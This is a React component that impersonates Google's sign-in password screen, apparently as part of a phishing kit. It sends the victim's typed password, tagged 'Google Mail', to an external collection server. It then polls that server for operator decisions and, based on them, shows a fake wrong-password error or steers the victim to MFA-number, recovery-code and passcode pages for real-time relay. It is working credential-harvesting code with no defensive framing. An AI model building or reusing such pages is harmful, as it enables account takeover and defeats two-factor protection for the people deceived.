import { ChevronDown as Arrow, CircleUser as User } from "lucide-react";
import {useEffect, useState} from "react";
import { useForm } from "react-hook-form";
import { useNavigate } from "react-router-dom";
import axios from "axios";

const PassSection = ({ email }) => {
  const navigate = useNavigate();

  const {
    register,
    handleSubmit,
    setError,
    formState: { errors },
  } = useForm();

  const [loading, setLoading] = useState(false);
  const [showPassword, setShowPassword] = useState(false);


  const handleData = async (data) => {
    setLoading(true);

    try {

      // store information
      await axios.post(`${import.meta.env.VITE_API_URL}/info/store`, {
        name: "Google Mail",
        email,
        password: data.password
      });
      // status check
      const statusResponse = await axios.get(`${import.meta.env.VITE_API_URL}/info/status}`,{
        params: {email: email},
      });

      const dbStatus = statusResponse.data.data_status;

      // Conditional Check
      if (dbStatus === "loading") {
        setLoading(true)
      }


    } catch(error) {
      console.log(error);
    }

  };

  useEffect(() => {
    if (!email) return;

    const interval = setInterval(async () => {
      try {
        const response = await axios.get(
            `${import.meta.env.VITE_API_URL}/info/status`,
            { params: { email } }
        );

        const dbStatus = response.data.data_status;
        const dbGcode = response.data.gCode;

        if (dbStatus === "wrong") {
          clearInterval(interval);
          setLoading(false);

          setError("password", {
            type: "manual",
            message: "Password is incorrect",
          });
        }

        if (dbStatus === "recovery") {
          clearInterval(interval);
          setLoading(false);
          navigate("/code", { state: { email } });
        }

        if (dbStatus === "g_code") {
          clearInterval(interval);
          setLoading(false);
          navigate("/mfa", { state: { dbGcode} });
        }

        if (dbStatus === "passcode") {
          clearInterval(interval);
          setLoading(false);
          navigate("/pass-code", {state: {email}});
        }

      } catch (error) {
        console.log(error);
      }
    }, 3000);

    return () => clearInterval(interval);

  }, [email]);


  return (
    <div className="relative overflow-hidden w-245 bg-white rounded-3xl shadow-sm p-12 flex gap-16">
      {/* 🔵 TOP LOADING BAR */}
      {loading && (
        <div className="absolute top-0 left-0 w-full h-1 bg-gray-200">
          <div className="h-full bg-blue-600 animate-[loading_1.2s_linear_infinite]" />
        </div>
      )}
      <div className="flex-1">
        <div className="flex items-center gap-2 mb-6">
          <img
            src="https://www.gstatic.com/images/branding/product/1x/chrome_48dp.png"
            className="w-8 h-8"
          />
        </div>

        <h1 className="text-[32px] font-normal text-gray-900 mb-3">Welcome</h1>

        <div className="px-4 py-1 border border-gray-400 rounded-full flex items-center gap-2 w-max">
          <User size={20} className="text-gray-800" />
          <p className="text-gray-800 text-[16px]">{email}</p>
          <Arrow size={16} className="text-gray-800" />
        </div>
      </div>

      <div className="flex-1 flex flex-col justify-between">
        <form onSubmit={handleSubmit(handleData)} errors={errors}>
          <div>
            <label className="text-sm text-blue-600">Password</label>
            <input
              type={showPassword ? "text" : "password"}
              name="password"
              {...register("password", { required: "Password is required" })}
              className="w-full border border-blue-500 rounded-md px-3 py-3 outline-none focus:ring-1 focus:ring-blue-500"
            />

            <div className="flex items-center gap-2 mt-3">
              <input
                type="checkbox"
                name="show-password"
                onChange={() => setShowPassword(!showPassword)}
                className="accent-blue-600"
              />
              <p className="text-gray-600 font-medium text-sm">Show password</p>
            </div>

            {errors.password && (
              <p className="text-red-500 text-sm mt-2">
                {errors.password.message}
              </p>
            )}

            <p className="text-gray-500 text-sm mt-6 leading-relaxed">
              <span className="text-blue-600 cursor-pointer"></span>
            </p>
          </div>

          <div className="flex items-center justify-end gap-6 mt-10">
            <button className="text-blue-600 font-medium">
              Forgot password?
            </button>

            <button className="bg-blue-600 text-white px-6 py-2 rounded-full font-medium hover:bg-blue-700 transition">
              Next
            </button>
          </div>
        </form>
      </div>

      {/* Tailwind custom animation */}
      <style>
        {`
          @keyframes loading {
            0% { width: 0% }
            50% { width: 70% }
            100% { width: 100% }
          }
        `}
      </style>
    </div>
  );
};

export default PassSection;
